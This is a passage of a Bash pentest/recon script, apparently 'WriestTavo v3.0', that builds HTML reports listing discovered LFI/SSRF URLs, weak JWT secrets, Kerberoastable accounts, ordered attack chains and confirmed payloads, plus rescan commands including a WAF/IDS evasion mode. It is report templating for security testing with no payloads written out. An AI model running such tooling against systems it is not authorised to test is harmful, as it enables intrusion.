  .section-title{font-size:15px;font-weight:700;color:#fff;margin-bottom:14px;
                 padding-bottom:10px;border-bottom:1px solid var(--border);
                 display:flex;align-items:center;gap:8px;}
  /* Attack Chains */
  .chain{border:1px solid var(--border);border-radius:8px;margin-bottom:14px;overflow:hidden;}
  .chain.critical{border-color:#ff2d2d55;}
  .chain-header{background:linear-gradient(90deg,#ff2d2d22,transparent);
                color:var(--red);font-weight:700;padding:12px 16px;
                font-size:13px;border-bottom:1px solid #ff2d2d33;}
  .chain-steps{padding:12px 16px;display:flex;flex-direction:column;gap:10px;}
  .step{display:flex;gap:12px;align-items:flex-start;}
  .step-num{background:var(--accent);color:#000;width:22px;height:22px;border-radius:50%;
            display:flex;align-items:center;justify-content:center;font-size:11px;
            font-weight:800;flex-shrink:0;margin-top:1px;}
  .step-body{flex:1;font-size:12px;}
  .step-body b{display:block;color:var(--txt);margin-bottom:4px;}
  /* Código */
  code{display:block;background:var(--bg);border:1px solid var(--border);
       border-radius:4px;padding:6px 12px;margin:4px 0;font-size:12px;
       color:var(--green);word-break:break-all;white-space:pre-wrap;}
  /* Hallazgos */
  .sev-group{margin-bottom:16px;}
  .sev-group-header{font-size:11px;font-weight:700;text-transform:uppercase;
                    letter-spacing:1.5px;padding:6px 12px;border-radius:4px;
                    margin-bottom:10px;display:inline-block;}
  .sev-group-header.sev-crítico{background:#ff2d2d22;color:var(--red);border:1px solid #ff2d2d44;}
  .sev-group-header.sev-alto{background:#ff6b3522;color:var(--orange);border:1px solid #ff6b3544;}
  .sev-group-header.sev-medio{background:#ffd23f22;color:var(--yellow);border:1px solid #ffd23f44;}
  .sev-group-header.sev-bajo{background:#3fb95022;color:var(--green);border:1px solid #3fb95044;}
  .sev-group-header.sev-info{background:#58a6ff22;color:var(--accent);border:1px solid #58a6ff44;}
  .finding{background:var(--bg);border-radius:6px;padding:14px 16px;
           margin-bottom:10px;transition:border-left-color .2s;}
  .f-title{display:flex;align-items:center;gap:8px;margin-bottom:8px;flex-wrap:wrap;}
  .f-sev{font-size:10px;font-weight:700;color:#000;padding:2px 8px;
         border-radius:3px;text-transform:uppercase;flex-shrink:0;}
  .f-name{font-size:13px;font-weight:600;color:#fff;flex:1;}
  .cvss-tag{font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;
            border:1px solid;flex-shrink:0;}
  .f-detail{font-size:12px;color:var(--txt2);margin-bottom:8px;
            line-height:1.7;}
  .f-detail code{color:var(--yellow);}
  .f-rem{background:var(--bg2);border-radius:4px;padding:8px 12px;
         font-size:12px;color:var(--txt2);margin-bottom:6px;}
  .f-next{background:#0c1f0f;border:1px solid #3fb95033;border-radius:4px;
          padding:8px 12px;font-size:12px;}
  .f-next code{color:var(--green);background:transparent;border:none;padding:0;}
  .label{font-size:10px;text-transform:uppercase;letter-spacing:1px;
         color:var(--txt2);display:block;margin-bottom:4px;}
  /* Tips */
  .tip{background:var(--bg);border:1px solid var(--border);border-radius:6px;
       padding:14px 16px;margin-bottom:12px;}
  .tip-title{font-size:13px;font-weight:700;color:#fff;margin-bottom:8px;}
  /* Payloads confirmados */
  .payload-log{width:100%;border-collapse:collapse;font-size:12px;}
  .payload-log th{background:var(--bg3);color:var(--txt2);padding:8px 12px;
                  text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;}
  .payload-log td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top;}
  .payload-log tr:last-child td{border-bottom:none;}
  .type-tag{background:var(--bg3);border:1px solid var(--border);padding:2px 8px;
            border-radius:3px;font-size:10px;text-transform:uppercase;color:var(--accent);}
  .p-code{color:var(--red);background:transparent;border:none;padding:0;
          font-size:11px;word-break:break-all;}
  .url-code{color:var(--yellow);background:transparent;border:none;padding:0;
            font-size:11px;word-break:break-all;}
  /* Stats */
  .stats-row{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;}
  .stat{background:var(--bg2);border:1px solid var(--border);border-radius:6px;
        padding:14px 18px;text-align:center;min-width:90px;}
  .stat-n{font-size:26px;font-weight:800;}
  .stat-l{font-size:10px;color:var(--txt2);text-transform:uppercase;margin-top:3px;}
  /* Scrollbar */
  ::-webkit-scrollbar{width:6px;height:6px;}
  ::-webkit-scrollbar-track{background:var(--bg2);}
  ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
  ::-webkit-scrollbar-thumb:hover{background:#444c56;}
</style>
</head><body>

<div class="header">
  <div class="header-badge">⚡ CONFIDENCIAL — USO INTERNO — PENTESTER</div>
  <h1>🔍 Reporte Técnico Completo — ${TARGET}</h1>
  <div class="header-meta">
    <span>📅 <b>$(date '+%d/%m/%Y %H:%M')</b></span>
    <span>🎯 Target: <b>${TARGET}</b></span>
    <span>🔧 Modo: <b>${SCAN_MODE}</b></span>
    <span>📊 Módulos: <b>45</b></span>
    <span>🗂️ Output: <b>${OUTPUT_DIR}/</b></span>
  </div>
</div>

<div class="container">

<!-- INTEL COMPLETO -->
<div class="section">
  <div class="section-title">🧠 INTEL — Contexto Técnico Completo</div>
  <div class="intel-grid">
    $([ -n "$INTEL_OS" ]                && echo "<div class='intel-item'><span class='intel-label'>OS</span><span class='intel-val'>${INTEL_OS}</span></div>")
    $([ -n "$INTEL_CMS" ]               && echo "<div class='intel-item'><span class='intel-label'>CMS</span><span class='intel-val'>${INTEL_CMS}</span></div>")
    $([ -n "$INTEL_FRAMEWORK_BACKEND" ] && echo "<div class='intel-item'><span class='intel-label'>Backend</span><span class='intel-val'>${INTEL_FRAMEWORK_BACKEND}</span></div>")
    $([ -n "$INTEL_FRAMEWORK_JS" ]      && echo "<div class='intel-item'><span class='intel-label'>Frontend JS</span><span class='intel-val'>${INTEL_FRAMEWORK_JS}</span></div>")
    $([ -n "$INTEL_WAF_NAME" ]          && echo "<div class='intel-item'><span class='intel-label'>WAF</span><span class='intel-val'>${INTEL_WAF_NAME}</span></div>")
    $([ -n "$INTEL_GRAPHQL_URL" ]       && echo "<div class='intel-item'><span class='intel-label'>GraphQL URL</span><span class='intel-val'>${INTEL_GRAPHQL_URL}</span></div>")
    $([ -n "$INTEL_SWAGGER_URL" ]       && echo "<div class='intel-item'><span class='intel-label'>Swagger URL</span><span class='intel-val'>${INTEL_SWAGGER_URL}</span></div>")
    $([ -n "$INTEL_LFI_URL" ]           && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>LFI URL</span><span class='intel-val' style='color:var(--red)'>${INTEL_LFI_URL}</span></div>")
    $([ -n "$INTEL_LFI_PARAM" ]         && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>LFI Param</span><span class='intel-val' style='color:var(--red)'>${INTEL_LFI_PARAM}</span></div>")
    $([ -n "$INTEL_SSRF_URL" ]          && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>SSRF URL</span><span class='intel-val' style='color:var(--red)'>${INTEL_SSRF_URL}</span></div>")
    $([ -n "$INTEL_CORS_ORIGIN" ]       && echo "<div class='intel-item' style='border-color:var(--orange)'><span class='intel-label'>CORS Origin</span><span class='intel-val' style='color:var(--orange)'>${INTEL_CORS_ORIGIN}</span></div>")
    $([ -n "$INTEL_JWT_WEAK_SECRET" ]   && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>JWT Secret</span><span class='intel-val' style='color:var(--red)'>${INTEL_JWT_WEAK_SECRET}</span></div>")
    $([ -n "$INTEL_CLOUD_PROVIDER" ]    && echo "<div class='intel-item'><span class='intel-label'>Cloud</span><span class='intel-val'>${INTEL_CLOUD_PROVIDER}</span></div>")
    $([ "${#INTEL_TECHNOLOGIES[@]}" -gt 0 ]   && echo "<div class='intel-item'><span class='intel-label'>Stack</span><span class='intel-val'>${INTEL_TECHNOLOGIES[*]}</span></div>")
    $([ "${#INTEL_INJECTABLE_URLS[@]}" -gt 0 ] && echo "<div class='intel-item'><span class='intel-label'>URLs inyectables</span><span class='intel-val'>${#INTEL_INJECTABLE_URLS[@]}</span></div>")
    $([ "${#INTEL_API_ENDPOINTS[@]}" -gt 0 ]   && echo "<div class='intel-item'><span class='intel-label'>API Endpoints</span><span class='intel-val'>${#INTEL_API_ENDPOINTS[@]}</span></div>")
    $([ "${#INTEL_JWT_TOKENS[@]}" -gt 0 ]      && echo "<div class='intel-item' style='border-color:var(--yellow)'><span class='intel-label'>JWT Tokens</span><span class='intel-val' style='color:var(--yellow)'>${#INTEL_JWT_TOKENS[@]} encontrados</span></div>")
    $([ "${#AD_KERBEROASTABLE[@]}" -gt 0 ]     && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>Kerberoastable</span><span class='intel-val' style='color:var(--red)'>${#AD_KERBEROASTABLE[@]} SPNs</span></div>")
    $([ "${#AD_ADCS_TEMPLATES[@]}" -gt 0 ]     && echo "<div class='intel-item' style='border-color:var(--red)'><span class='intel-label'>ADCS ESC</span><span class='intel-val' style='color:var(--red)'>${#AD_ADCS_TEMPLATES[@]} templates</span></div>")
  </div>
</div>

<!-- STATS -->
<div class="stats-row">
$(local crit2=0 alto2=0 med2=0 baj2=0 inf2=0
  for f in "${FINDINGS[@]}"; do
    case $(echo "$f"|awk -F'|||' '{print $1}') in
      CRÍTICO) ((crit2++)) ;; ALTO) ((alto2++)) ;;
      MEDIO)   ((med2++))  ;; BAJO) ((baj2++)) ;; *) ((inf2++)) ;;
    esac
  done
  echo "<div class='stat'><div class='stat-n' style='color:var(--red);'>${crit2}</div><div class='stat-l'>Críticos</div></div>"
  echo "<div class='stat'><div class='stat-n' style='color:var(--orange);'>${alto2}</div><div class='stat-l'>Altos</div></div>"
  echo "<div class='stat'><div class='stat-n' style='color:var(--yellow);'>${med2}</div><div class='stat-l'>Medios</div></div>"
  echo "<div class='stat'><div class='stat-n' style='color:var(--green);'>${baj2}</div><div class='stat-l'>Bajos</div></div>"
  echo "<div class='stat'><div class='stat-n' style='color:var(--accent);'>${inf2}</div><div class='stat-l'>Info</div></div>")
</div>

<!-- RUTAS DE ATAQUE ENCADENADAS -->
$(if [[ -n "$attack_chains" ]]; then
  echo "<div class='section'>"
  echo "<div class='section-title'>⛓️ RUTAS DE ATAQUE ENCADENADAS</div>"
  echo "<p style='font-size:12px;color:var(--txt2);margin-bottom:16px;'>Attack chains identificadas según el INTEL recolectado. Ejecutar en orden indicado.</p>"
  echo "$attack_chains"
  echo "</div>"
fi)

<!-- PAYLOADS EFECTIVOS -->
<div class="section">
  <div class="section-title">💣 PAYLOADS / TÉCNICAS CONFIRMADAS</div>
  ${confirmed_payload_html}
</div>

<!-- URLs INYECTABLES -->
$(if (( ${#INTEL_INJECTABLE_URLS[@]} > 0 )); then
  echo "<div class='section'>"
  echo "<div class='section-title'>🎯 URLs con Parámetros Inyectables</div>"
  echo "<div style='font-size:12px;'>"
  for u in "${INTEL_INJECTABLE_URLS[@]}"; do
    echo "<code style='color:var(--yellow);'>$u</code>"
  done
  echo "</div></div>"
fi)

<!-- TODOS LOS HALLAZGOS TÉCNICOS -->
<div class="section">
  <div class="section-title">📋 TODOS LOS HALLAZGOS — DETALLE TÉCNICO COMPLETO</div>
  ${all_findings_html}
</div>

<!-- TIPS DE EXPLORACIÓN MANUAL -->
<div class="section">
  <div class="section-title">🧭 TIPS PARA EXPLORACIÓN MANUAL</div>
  <p style='font-size:12px;color:var(--txt2);margin-bottom:14px;'>
    Basados en el stack detectado y los hallazgos. Rutas de profundización manual recomendadas.
  </p>
  ${manual_tips}
  <div class='tip'>
    <div class='tip-title'>📁 Archivos Generados para Análisis</div>
    <code>ls -la ${OUTPUT_DIR}/</code>
    <code>cat ${OUTPUT_DIR}/web/sqli_results.txt</code>
    <code>cat ${OUTPUT_DIR}/web/js_analysis.txt  # Secrets en JS bundles</code>
    <code>cat ${OUTPUT_DIR}/recon/nuclei_result.txt | grep -E 'critical|high'</code>
    $([ -n "$AD_DC_IP" ] && echo "<code>ls -la ${OUTPUT_DIR}/active_directory/  # Dumps AD</code>")
  </div>
  <div class='tip'>
    <div class='tip-title'>🔄 Comandos de Seguimiento Rápido</div>
    <code>sudo ./wriestTavo.sh --show-cves  # Ver CVEs cacheados del stack</code>
    <code>sudo ./wriestTavo.sh ${TARGET} --mode aggressive  # Re-scan agresivo</code>
    <code>sudo ./wriestTavo.sh ${TARGET} --mode stealth    # Evasión de WAF/IDS</code>
    <code>sudo searchsploit --update &amp;&amp; sudo ./wriestTavo.sh ${TARGET}  # Con BD actualizada</code>
  </div>
</div>

</div>
</body></html>
PTHTML

    ok "Reporte Pentester → ${REPORT_PENTESTER}"
}

# ════════════════════════════════════════════════════════════════
# ORQUESTADOR — Genera los 3 reportes y muestra resumen final
# ════════════════════════════════════════════════════════════════
generar_tres_reportes() {
    echo
    log "Generando 3 tipos de reportes especializados..."
    echo -e "  ${C_DIM}Esto puede tomar unos segundos...${C_RST}"
    echo

    generar_reporte_cliente
    generar_reporte_censurado
    generar_reporte_pentester

    echo
    echo -e "${C_PUR}  ╔═════════════════════════════════════════════════╗${C_RST}"
    echo -e "${C_PUR}  ║         📊 REPORTES GENERADOS                   ║${C_RST}"
    echo -e "${C_PUR}  ╚═════════════════════════════════════════════════╝${C_RST}"
    echo
    echo -e "  ${C_YEL}1. Cliente IT${C_RST}   → ${C_CYN}$(basename "$REPORT_CLIENT")${C_RST}"
    echo -e "     ${C_DIM}Resumen ejecutivo + payloads aplicables + plan de acción${C_RST}"
    echo
    echo -e "  ${C_YEL}2. Censurado${C_RST}    → ${C_CYN}$(basename "$REPORT_CENSORED")${C_RST}"
    echo -e "     ${C_DIM}IPs/URLs/tokens/comandos redactados — para terceros/compliance${C_RST}"
    echo
    echo -e "  ${C_YEL}3. Pentester${C_RST}    → ${C_CYN}$(basename "$REPORT_PENTESTER")${C_RST}"
    echo -e "     ${C_DIM}Técnico completo + rutas de ataque encadenadas + tips${C_RST}"
    echo
    [[ -n "$REPORT_FILE" ]] && \
        echo -e "  ${C_YEL}Original${C_RST}      → ${C_CYN}$(basename "$REPORT_FILE")${C_RST}"
    echo
}


# ─── REPORTE HTML PROFESIONAL ────────────────────────────────────
generar_reporte_html() {
    log "Generando Reporte HTML Profesional..."

    # ── INTEL SUMMARY: construir resumen de lo aprendido ──
    local intel_summary_html=""
    intel_summary_html+="<div class='intel-box'>"
    intel_summary_html+="<h3>🧠 Contexto Acumulado (INTEL)</h3>"
    intel_summary_html+="<div class='intel-grid'>"
    [[ -n "$INTEL_OS" ]]           && intel_summary_html+="<div class='intel-item'><span class='intel-label'>OS</span><span class='intel-val'>${INTEL_OS}</span></div>"
    [[ -n "$INTEL_CMS" ]]          && intel_summary_html+="<div class='intel-item'><span class='intel-label'>CMS</span><span class='intel-val'>${INTEL_CMS}</span></div>"
    [[ -n "$INTEL_FRAMEWORK_JS" ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Framework JS</span><span class='intel-val'>${INTEL_FRAMEWORK_JS}</span></div>"
    intel_summary_html+="<div class='intel-item'><span class='intel-label'>WAF</span><span class='intel-val'>$([ "$INTEL_WAF_DETECTED" = "true" ] && echo "${INTEL_WAF_NAME}" || echo "No detectado")</span></div>"
    [[ ${#INTEL_TECHNOLOGIES[@]} -gt 0 ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Tecnologías</span><span class='intel-val'>${INTEL_TECHNOLOGIES[*]}</span></div>"
    [[ ${#INTEL_API_ENDPOINTS[@]} -gt 0 ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>API Endpoints</span><span class='intel-val'>${#INTEL_API_ENDPOINTS[@]} encontrados</span></div>"
    [[ ${#INTEL_SERVICES[@]} -gt 0 ]]     && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Servicios</span><span class='intel-val'>${#INTEL_SERVICES[@]} detectados</span></div>"
    intel_summary_html+="<div class='intel-item'><span class='intel-label'>SQLi</span><span class='intel-val'>$([ "$INTEL_SQLI_FOUND" = "true" ] && echo "CONFIRMADO ⚠" || echo "No detectado")</span></div>"
    intel_summary_html+="<div class='intel-item'><span class='intel-label'>XSS</span><span class='intel-val'>$([ "$INTEL_XSS_FOUND" = "true" ] && echo "CONFIRMADO ⚠" || echo "No detectado")</span></div>"
    [[ -n "$INTEL_GRAPHQL_URL" ]]  && intel_summary_html+="<div class='intel-item'><span class='intel-label'>GraphQL</span><span class='intel-val'>${INTEL_GRAPHQL_URL}</span></div>"
    [[ -n "$INTEL_SWAGGER_URL" ]]  && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Swagger</span><span class='intel-val'>${INTEL_SWAGGER_URL}</span></div>"
    [[ "$INTEL_XXE_FOUND" == "true"           ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>XXE</span><span class='intel-val'>CONFIRMADO ⚠</span></div>"
    [[ "$INTEL_OPEN_REDIRECT_FOUND" == "true" ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Open Redirect</span><span class='intel-val'>CONFIRMADO</span></div>"
    [[ "$INTEL_IDOR_FOUND" == "true"          ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>IDOR</span><span class='intel-val'>POTENCIAL ⚠</span></div>"
    [[ "$INTEL_WEBDAV" == "true"              ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>WebDAV</span><span class='intel-val'>ACTIVO ⚠</span></div>"
    [[ "$INTEL_DOCKER_EXPOSED" == "true"      ]] && intel_summary_html+="<div class='intel-item' style='border-color:#ff2d2d'><span class='intel-label'>Docker API</span><span class='intel-val' style='color:#ff2d2d'>EXPUESTA ⚠</span></div>"
    [[ "$INTEL_K8S_EXPOSED" == "true"         ]] && intel_summary_html+="<div class='intel-item' style='border-color:#ff2d2d'><span class='intel-label'>Kubernetes</span><span class='intel-val' style='color:#ff2d2d'>EXPUESTO ⚠</span></div>"
    [[ -n "$INTEL_CLOUD_PROVIDER" ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Cloud</span><span class='intel-val'>${INTEL_CLOUD_PROVIDER}</span></div>"
    intel_summary_html+="</div></div>"

    local critical_count=0 high_count=0 medium_count=0 low_count=0 info_count=0
    local total_cvss=0 cvss_count=0
    local findings_html=""
    local exec_critical="" exec_high="" exec_medium=""

    for finding in "${FINDINGS[@]}"; do
        local severity title detail cvss remediation next_step
        severity=$(echo    "$finding" | awk -F'|||' '{print $1}')
        title=$(echo       "$finding" | awk -F'|||' '{print $2}')
        detail=$(echo      "$finding" | awk -F'|||' '{print $3}')
        cvss=$(echo        "$finding" | awk -F'|||' '{print $4}')
        remediation=$(echo "$finding" | awk -F'|||' '{print $5}')
        next_step=$(echo   "$finding" | awk -F'|||' '{print $6}')

        case "$severity" in
            "CRÍTICO") ((critical_count++)); color="#ff2d2d"; sev_num=4 ;;
            "ALTO")    ((high_count++));     color="#ff6b35"; sev_num=3 ;;
            "MEDIO")   ((medium_count++));   color="#ffd23f"; sev_num=2 ;;
            "BAJO")    ((low_count++));      color="#57cc99"; sev_num=1 ;;
            *)         ((info_count++));     color="#5bc0de"; sev_num=0 ;;
        esac

        # CVSS promedio
        if [[ "$cvss" =~ ^[0-9] ]]; then
            local cvss_val; cvss_val=$(echo "$cvss" | grep -oE '^[0-9]+\.?[0-9]*' | head -1)
            if [[ -n "$cvss_val" ]]; then
                total_cvss=$(python3 -c "print(${total_cvss}+${cvss_val})" 2>/dev/null || echo "$total_cvss")
                ((cvss_count++)) || true
            fi
        fi

        # Resumen ejecutivo para hallazgos críticos/altos
        [[ "$severity" == "CRÍTICO" ]] && exec_critical+="<li><b>${title}</b> — CVSS: ${cvss}</li>"
        [[ "$severity" == "ALTO"    ]] && exec_high+="<li><b>${title}</b> — CVSS: ${cvss}</li>"
        [[ "$severity" == "MEDIO"   ]] && exec_medium+="<li>${title}</li>"

        local sev_class
        sev_class=$(echo "$severity" | tr '[:upper:]' '[:lower:]' | \
            sed 's/ítico/itico/g; s/é/e/g; s/ó/o/g; s/ /_/g')

        # Badge de CVSS con color
        local cvss_color="#5bc0de"
        if [[ "$cvss" =~ ^[0-9] ]]; then
            local cv_num; cv_num=$(echo "$cvss" | grep -oE '^[0-9]+' | head -1)
            (( cv_num >= 9  )) && cvss_color="#ff2d2d"
            (( cv_num >= 7 && cv_num < 9 )) && cvss_color="#ff6b35"
            (( cv_num >= 4 && cv_num < 7 )) && cvss_color="#ffd23f"
        fi

        findings_html+="<div class='finding finding-${sev_class}'>"
        findings_html+="<div class='finding-header'>"
        findings_html+="<span class='badge' style='background:${color};'>${severity}</span>"
        [[ -n "$cvss" && "$cvss" != "N/A" ]] && \
            findings_html+="<span class='cvss-badge' style='border-color:${cvss_color};color:${cvss_color};'>CVSS ${cvss}</span>"
        findings_html+="<span class='finding-title'>${title}</span>"
        findings_html+="</div>"
        findings_html+="<div class='finding-detail'>"
        findings_html+="${detail}"
        if [[ -n "$remediation" ]]; then
            findings_html+="<div class='remediation-box'>"
            findings_html+="<div class='remediation-title'>🔧 Cómo Corregir</div>"
            findings_html+="<div class='remediation-text'>${remediation}</div>"
            findings_html+="</div>"
        fi
        if [[ -n "$next_step" ]]; then
            findings_html+="<div class='nextstep-box'>"
            findings_html+="<div class='nextstep-title'>➡️ Siguiente Paso</div>"
            findings_html+="<div class='nextstep-text'><code>${next_step}</code></div>"
            findings_html+="</div>"
        fi
        findings_html+="</div></div>"
    done

    # CVSS promedio del scan
    local avg_cvss="N/A"
    if (( cvss_count > 0 )); then
        avg_cvss=$(python3 -c "print(round(${total_cvss}/${cvss_count},1))" 2>/dev/null || echo "N/A")
    fi

    # Resumen ejecutivo HTML
    local exec_html=""
    exec_html+="<div class='exec-summary'>"
    exec_html+="<h2 class='section-title'>📋 Resumen Ejecutivo (Para Dirección)</h2>"
    exec_html+="<div class='exec-intro'>"
    exec_html+="<p>Se realizó un análisis de seguridad sobre <b>${TARGET}</b> el <b>$(date '+%d/%m/%Y')</b>. "
    exec_html+="Se identificaron <b>${critical_count} hallazgos críticos</b>, <b>${high_count} altos</b>, "
    exec_html+="<b>${medium_count} medios</b> y <b>${low_count} bajos</b>.</p>"
    if [[ "$avg_cvss" != "N/A" ]]; then
        local risk_level="BAJO"
        local risk_color="#57cc99"
        (( $(echo "$avg_cvss >= 7" | bc -l 2>/dev/null || echo 0) )) && risk_level="ALTO" && risk_color="#ff6b35"
        (( $(echo "$avg_cvss >= 9" | bc -l 2>/dev/null || echo 0) )) && risk_level="CRÍTICO" && risk_color="#ff2d2d"
        (( $(echo "$avg_cvss >= 4 && $avg_cvss < 7" | bc -l 2>/dev/null || echo 0) )) && risk_level="MEDIO" && risk_color="#ffd23f"
        exec_html+="<p>El <b>nivel de riesgo global</b> del sistema es: <span style='color:${risk_color};font-weight:bold;font-size:16px;'>${risk_level} (CVSS promedio: ${avg_cvss})</span></p>"
    fi
    exec_html+="</div>"
    if [[ -n "$exec_critical" ]]; then
        exec_html+="<div class='exec-section exec-crit'><h3>🔴 Acción Inmediata Requerida</h3><ul>${exec_critical}</ul></div>"
    fi
    if [[ -n "$exec_high" ]]; then
        exec_html+="<div class='exec-section exec-high'><h3>🟠 Corregir en próximo Sprint</h3><ul>${exec_high}</ul></div>"
    fi
    if [[ -n "$exec_medium" ]]; then
        exec_html+="<div class='exec-section exec-med'><h3>🟡 Backlog de Seguridad</h3><ul>${exec_medium}</ul></div>"
    fi
    exec_html+="<div class='exec-note'><b>Nota:</b> Este reporte fue generado automáticamente con WriestTavo v3.0. "
    exec_html+="Los hallazgos deben ser validados manualmente antes de reportar en Bug Bounty o presentar a clientes.</div>"
    exec_html+="</div>"

    cat > "${REPORT_FILE}" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WriestTavo v3 Report</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}
a{color:#58a6ff}
.header{background:linear-gradient(135deg,#0d1117 0%,#1a1f2e 50%,#0d1117 100%);padding:30px;border-bottom:3px solid #58a6ff}
.header h1{color:#58a6ff;font-size:26px;margin-bottom:4px;letter-spacing:1px}
.ver{color:#3fb950;font-size:11px;font-weight:bold;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}
.header .meta{display:flex;gap:12px;margin-top:14px;flex-wrap:wrap}
.meta-item{background:#161b22;padding:7px 14px;border-radius:6px;border:1px solid #30363d;font-size:13px}
.meta-item span{color:#58a6ff;font-weight:600}
.container{max-width:1300px;margin:0 auto;padding:24px}
.section-title{font-size:19px;color:#58a6ff;margin:26px 0 14px;padding-bottom:8px;border-bottom:1px solid #30363d}
/* EXEC SUMMARY */
.exec-summary{background:#0d1117;border:1px solid #1f6feb;border-radius:10px;padding:22px;margin:18px 0}
.exec-intro{color:#c9d1d9;margin-bottom:14px;font-size:14px;line-height:1.8}
.exec-section{margin:10px 0;padding:12px 16px;border-radius:8px;border-left:4px solid}
.exec-crit{background:#1a0a0a;border-color:#ff2d2d}
.exec-high{background:#1a0f0a;border-color:#ff6b35}
.exec-med{background:#1a1600;border-color:#ffd23f}
.exec-section h3{font-size:13px;margin-bottom:7px}
.exec-section li{padding:3px 0;font-size:13px}
.exec-note{margin-top:14px;padding:10px 14px;background:#161b22;border-radius:6px;font-size:12px;color:#8b949e;border-left:3px solid #8b949e}
/* CARDS */
.summary{display:flex;gap:12px;margin:14px 0;flex-wrap:wrap}
.card{flex:1;min-width:105px;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;text-align:center}
.card .count{font-size:36px;font-weight:800}
.card .label{font-size:11px;color:#8b949e;margin-top:4px;text-transform:uppercase;letter-spacing:1px}
.card.critical{border-top:4px solid #ff2d2d}.card.critical .count{color:#ff2d2d}
.card.high{border-top:4px solid #ff6b35}.card.high .count{color:#ff6b35}
.card.medium{border-top:4px solid #ffd23f}.card.medium .count{color:#ffd23f}
.card.low{border-top:4px solid #57cc99}.card.low .count{color:#57cc99}
.card.info{border-top:4px solid #5bc0de}.card.info .count{color:#5bc0de}
.card.cvss-card{border-top:4px solid #a371f7}.card.cvss-card .count{color:#a371f7;font-size:26px}
/* INTEL */
.intel-box{background:#0d1117;border:1px solid #1f6feb;border-radius:8px;padding:14px 18px;margin:18px 0}
.intel-box h3{color:#3fb950;margin-bottom:10px;font-size:14px}
.intel-grid{display:flex;flex-wrap:wrap;gap:8px}
.intel-item{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:5px 11px;font-size:12px}
.intel-label{color:#8b949e;margin-right:5px}
.intel-val{color:#e6edf3;font-weight:600}
/* FINDINGS */
.finding{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:10px;overflow:hidden}
.finding-critictico{border-left:4px solid #ff2d2d}
.finding-alto{border-left:4px solid #ff6b35}
.finding-medio{border-left:4px solid #ffd23f}
.finding-bajo{border-left:4px solid #57cc99}
.finding-info{border-left:4px solid #5bc0de}
.finding-header{display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;user-select:none}
.finding-header:hover{background:#1f2937}
.badge{padding:3px 9px;border-radius:4px;font-size:11px;font-weight:800;color:#000;min-width:66px;text-align:center}
.cvss-badge{padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:transparent;border:1px solid;min-width:76px;text-align:center}
.finding-title{font-weight:600;font-size:14px;color:#e6edf3;flex:1}
.finding-detail{padding:14px 16px;background:#0d1117;border-top:1px solid #30363d;font-size:13px;display:none}
.finding.open .finding-detail{display:block}
/* REMEDIATION */
.remediation-box{margin-top:12px;padding:12px 14px;background:#0a1628;border:1px solid #1f6feb;border-radius:6px}
.remediation-title{color:#58a6ff;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
.remediation-text{color:#c9d1d9;font-size:13px;line-height:1.7}
.nextstep-box{margin-top:8px;padding:12px 14px;background:#0a2010;border:1px solid #3fb950;border-radius:6px}
.nextstep-title{color:#3fb950;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
.nextstep-text code{color:#7ee787;font-size:12px;font-family:'Consolas',monospace;background:#161b22;padding:3px 7px;border-radius:4px;display:block;white-space:pre-wrap;word-break:break-all}
pre{background:#161b22;padding:10px;border-radius:4px;overflow-x:auto;font-size:12px;color:#7ee787;white-space:pre-wrap}
code{color:#7ee787;font-family:'Consolas',monospace}
.vuln-table{width:100%;border-collapse:collapse;font-size:12px;margin-top:10px}
.vuln-table th{background:#21262d;color:#8b949e;padding:8px 10px;text-align:left;border:1px solid #30363d}
.vuln-table td{padding:7px 10px;border:1px solid #21262d;vertical-align:top;word-break:break-all}
.vuln-table tr:hover td{background:#161b22}
td.critical,td.critico{color:#ff2d2d;font-weight:bold}
td.high,td.alto{color:#ff6b35;font-weight:bold}
td.medium,td.medio{color:#ffd23f;font-weight:bold}
td.vuln{color:#ff6b35;font-weight:bold}
.files-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:8px;margin-top:10px}
.file-item{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:8px 12px;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.footer{text-align:center;padding:22px;color:#484f58;font-size:12px;margin-top:38px;border-top:1px solid #21262d}
.filter-bar{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}
.filter-btn{padding:5px 14px;border-radius:20px;border:1px solid #30363d;background:#161b22;color:#8b949e;cursor:pointer;font-size:12px;transition:all .2s}
.filter-btn:hover,.filter-btn.active{background:#58a6ff;color:#000;border-color:#58a6ff;font-weight:700}
</style>
</head>
<body>
HTMLEOF

    cat >> "${REPORT_FILE}" << DYNEOF
<div class="header">
  <div class="container">
